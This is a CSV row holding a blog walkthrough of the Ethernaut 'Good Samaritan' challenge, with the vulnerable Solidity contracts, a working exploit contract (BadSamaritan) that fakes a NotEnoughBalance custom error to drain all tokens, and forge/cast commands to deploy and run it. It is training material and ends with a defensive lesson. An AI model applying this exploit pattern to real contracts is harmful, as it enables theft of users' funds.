event,content_url,content
Ethernaut Level 27 - Good Samaritan,https://blog.dixitaditya.com/ethernaut-level-27-good-samaritan,"There's a GoodSamaritan contract that holds a lot of tokens and donates 10 tokens to anyone who requests. Our goal is to drain the contract of all the tokens it holds by exploiting something called custom errors that were recently introduced in Solidity. 
Since the aftermath of the last level, I'm so glad they gave us an easy one this time.
GoodSamaritan
In this level, there are 3 contracts. GoodSamaritan is the one with which we'll be interacting. We can verify this by executing contract.abi in the console.
GoodSamaritan
contract.abi

Let's go through the contracts. 
contract Wallet {
    // The owner of the wallet instance
    address public owner;

    Coin public coin;

    error OnlyOwner();
    error NotEnoughBalance();

    modifier onlyOwner() {
        if(msg.sender != owner) {
            revert OnlyOwner();
        }
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function donate10(address dest_) external onlyOwner {
        // check balance left
        if (coin.balances(address(this)) < 10) {
            revert NotEnoughBalance();
        } else {
            // donate 10 coins
            coin.transfer(dest_, 10);
        }
    }

    function transferRemainder(address dest_) external onlyOwner {
        // transfer balance left
        coin.transfer(dest_, coin.balances(address(this)));
    }

    function setCoin(Coin coin_) external onlyOwner {
        coin = coin_;
    }
}

donate10()
GoodSamaritan
NotEnoughBalance()
transferRemainder()
onlyOwner
GoodSamaritan
contract Coin {
    using Address for address;

    mapping(address => uint256) public balances;

    error InsufficientBalance(uint256 current, uint256 required);

    constructor(address wallet_) {
        // one million coins for Good Samaritan initially
        balances[wallet_] = 10**6;
    }

    function transfer(address dest_, uint256 amount_) external {
        uint256 currentBalance = balances[msg.sender];

        // transfer only occurs if balance is enough
        if(amount_ <= currentBalance) {
            balances[msg.sender] -= amount_;
            balances[dest_] += amount_;

            if(dest_.isContract()) {
                // notify contract 
                INotifyable(dest_).notify(amount_);
            }
        } else {
            revert InsufficientBalance(currentBalance, amount_);
        }
    }
}

GoodSamaritan
transfer
if(dest_.isContract())
notify()
dest_
INotifyable(dest_).notify(amount_)
contract GoodSamaritan {
    Wallet public wallet;
    Coin public coin;

    constructor() {
        wallet = new Wallet();
        coin = new Coin(address(wallet));

        wallet.setCoin(coin);
    }

    function requestDonation() external returns(bool enoughBalance){
        // donate 10 coins to requester
        try wallet.donate10(msg.sender) {
            return true;
        } catch (bytes memory err) {
            if (keccak256(abi.encodeWithSignature(""NotEnoughBalance()"")) == keccak256(err)) {
                // send the coins left
                wallet.transferRemainder(msg.sender);
                return false;
            }
        }
    }
}

Wallet
Coin
requestDonation()
try
catch
try
wallet.donate10(msg.sender)
msg.sender
catch
try
NotEnoughBalance()
Let's take a few steps back and trace what happens when we call the requestDonation() function:
requestDonation()
requestDonation()
wallet.donate10(msg.sender)
coin.transfer()
coin.transfer()
notify()
notify()
NotEnoughBalance()
GoodSamaritan.requestDonation()
catch()
notify()
amount <= 10
Here's how our exploits code looks like:
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import ""../instances/Ilevel27.sol"";

contract BadSamaritan {

    error NotEnoughBalance();

    GoodSamaritan goodsamaritan  = GoodSamaritan(0xcf2e93212faddDeB5ca99606104Be3Bae28e27A4); //ethernaut instance address
    function attax() external {
        goodsamaritan.requestDonation();
    }

    function notify(uint256 amount) external pure {
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }
}

attax()
requestDonation()
notify()
catch
requestDonation()
notify()
if
Let's deploy our contract using the following command:
forge create BadSamaritan --private-key $PKEY --rpc-url $RPC_URL

Now to call the attax() function:
attax()
cast send 0xb5daE871ADAFD33ee4B6Bf782a30b238902715F6 ""attax()"" --private-key $PKEY --rpc-url $RPC_URL --gas-limit 1000000

I specified a large gas limit because the transaction kept failing. 

The instance can now be submitted to finish the level. 
My Github Repository containing all the codes: github.com/az0mb13/ethernaut-foundry
My article on setting up your workspace to get started with Ethernaut using Foundry and Solidity - blog.dixitaditya.com/getting-started-with-e..
It is a really bad idea to give execution control to the hands of any external user and then use any dependent condition based on the external factor to decide a critical logic in the contract. "
